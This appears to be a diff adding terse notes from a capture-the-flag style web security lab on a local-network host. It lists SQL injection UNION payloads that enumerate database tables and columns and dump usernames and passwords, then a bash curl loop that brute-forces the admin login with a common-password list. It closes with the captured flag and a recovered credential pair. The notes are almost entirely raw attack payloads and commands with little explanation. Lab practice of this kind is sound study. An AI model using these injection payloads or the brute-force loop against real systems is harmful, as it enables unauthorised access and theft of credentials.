@@ -1,0 +1,10 @@
+- http://192.168.120.128/index.php?page=member
+- 0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES (Get tables name in the DB)
+- 0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS (find table columns in the DB for each table)
+- 0 OR 1 = 2 UNION SELECT username, password FROM Member_Brute_Force.db_default
+- Admin or root as login
+- Password pool: http://datanews.levif.be/ict/actualite/le-top-25-des-mots-de-passe-les-plus-courants-et-les-plus-faibles/article-normal-292823.html
+- for i in ${password[@]}; do curl -X POST "http://192.168.2.128/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag' done
+THE FLAG IS :B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+admin : shadow
+
